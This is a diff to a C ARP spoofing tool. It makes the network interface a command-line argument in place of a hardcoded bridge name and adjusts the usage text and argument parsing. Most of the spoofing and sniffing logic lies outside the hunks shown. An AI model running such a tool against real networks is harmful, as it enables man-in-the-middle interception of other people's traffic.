@@ -7,8 +7,8 @@
 #include <unistd.h>
 #include <net/if.h>
 #include <sys/ioctl.h>
-#include <linux/if_packet.h>   
-#include <sys/ioctl.h>        
+#include <linux/if_packet.h>
+#include <sys/ioctl.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <pthread.h>
@@ -18,7 +18,7 @@
 #define ARP_PKT_LEN 28
 
 int verbose = 0;
-const char *iface = "br-f4cea654e3fb";
+const char *iface;
 typedef struct eth_h {
     unsigned char dest_mac[6];
     unsigned char src_mac[6];
@@ -50,7 +50,7 @@ char * get_mac(void)
 void send_arp_reply(char* target_mac, char* target_ip,char* victim_ip)
 {
     char* my_mac = get_mac();
-   
+
     int sockfd;
     unsigned char buffer[ETH_HDR_LEN + ARP_PKT_LEN];
     eth_hdr *eth = (eth_hdr *)buffer;
@@ -145,8 +145,9 @@ void* sniff_packets(void *arg) {
 }
 
 void print_usage(char *program) {
-    printf("Usage: %s <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]\n", program);
+    printf("Usage: %s <interface> <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]\n", program);
     printf("Parameters:\n");
+    printf("  <interface>  : Network interface (e.g., eth0, wlan0)\n");
     printf("  <IP-src>     : Source IP address\n");
     printf("  <MAC-src>    : Source MAC address\n");
     printf("  <IP-target>  : Target IP address\n");
@@ -172,19 +173,20 @@ int is_valid_ip(char *ip) {
 }
 
 int main(int argc, char *argv[]) {
-    if (argc < 5)
+    if (argc < 6)
         print_usage(argv[0]);
 
-    if (argc > 5 && strcmp(argv[5], "-v") != 0)
+    if (argc > 6 && strcmp(argv[6], "-v") != 0)
         print_usage(argv[0]);
 
-    verbose = (argc > 5 && strcmp(argv[5], "-v") == 0);
+    verbose = (argc > 6 && strcmp(argv[6], "-v") == 0);
 
-    char *src_ip = argv[1];
-    char *src_mac = argv[2];
-    char *target_ip = argv[3];
-    char *target_mac = argv[4];
-    
+    iface = argv[1];
+    char *src_ip = argv[2];
+    char *src_mac = argv[3];
+    char *target_ip = argv[4];
+    char *target_mac = argv[5];
+
     if (!is_valid_ip(src_ip) || !is_valid_mac(src_mac) ||
         !is_valid_ip(target_ip) || !is_valid_mac(target_mac)) {
         printf("Invalid IP or MAC address\n");
@@ -194,6 +196,7 @@ int main(int argc, char *argv[]) {
 
     if (verbose) {
         printf("Starting ARP spoofing attack:\n");
+        printf("Interface: %s\n", iface);
         printf("Source IP: %s, Source MAC: %s\n", src_ip, src_mac);
         printf("Target IP: %s, Target MAC: %s\n", target_ip, target_mac);
     }
